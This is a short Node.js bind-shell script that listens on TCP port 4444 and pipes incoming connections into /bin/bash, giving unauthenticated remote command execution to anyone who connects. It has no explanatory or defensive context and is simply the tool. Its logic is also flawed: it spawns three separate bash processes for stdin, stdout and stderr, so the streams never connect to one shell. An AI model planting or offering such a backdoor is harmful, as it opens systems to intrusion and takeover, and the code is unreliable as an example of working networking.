const net = require('net');
const cp = require('child_process');

const server = net.createServer((socket) => {
    console.log('[+] Connection received');

    // Pipe remote input into shell
    socket.pipe(cp.spawn('/bin/bash', []).stdin);
    cp.spawn('/bin/bash', []).stdout.pipe(socket);
    cp.spawn('/bin/bash', []).stderr.pipe(socket);
});

const PORT = 4444;
server.listen(PORT, () => {
    console.log(`[+] Listening on port ${PORT}`);
});
